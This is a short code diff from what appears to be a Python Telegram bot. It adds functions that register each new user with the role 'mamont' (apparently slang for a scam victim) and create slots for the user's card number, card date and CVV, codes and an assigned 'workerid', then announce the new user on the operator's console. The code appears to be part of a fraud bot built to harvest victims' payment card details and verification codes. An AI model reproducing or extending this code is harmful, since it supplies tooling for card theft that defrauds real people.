@@ -106,3 +106,20 @@ def printlogo():
     for i in range(0,len(logo)):
         print(Back.BLACK+Fore.WHITE+str(logo[i])[:-1])
         sleep(0.1)
+
+def checklogin(message):
+    if str(message.from_user.id) not in id:
+        loginUser(message)
+
+def loginUser(message):
+    id.append(str(message.from_user.id))
+    username.append(message.from_user.username)
+    cash.append(0)
+    role.append('mamont')
+    stage.append(0)
+    card.append('none')
+    datecvv.append('none')
+    codes.append('none')
+    workerid.append('none')
+    print(Back.BLACK + Fore.WHITE + f'/// new user {message.from_user.username}. check ./data/' + Back.RESET)
+    savedata()
